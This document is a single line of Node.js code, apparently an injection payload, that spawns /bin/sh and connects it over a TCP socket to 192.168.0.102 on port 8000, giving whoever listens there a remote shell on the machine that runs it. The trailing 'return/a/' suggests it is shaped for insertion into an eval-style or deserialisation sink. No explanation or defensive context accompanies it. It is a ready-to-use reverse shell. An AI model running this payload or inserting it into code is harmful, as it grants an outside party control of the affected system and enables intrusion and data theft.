(function(){net=require("net");cp=require('child_process');sh=cp.spawn("/bin/sh",[]);c=new net.Socket();c.connect(8000,"192.168.0.102",()=>{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});return/a/})()
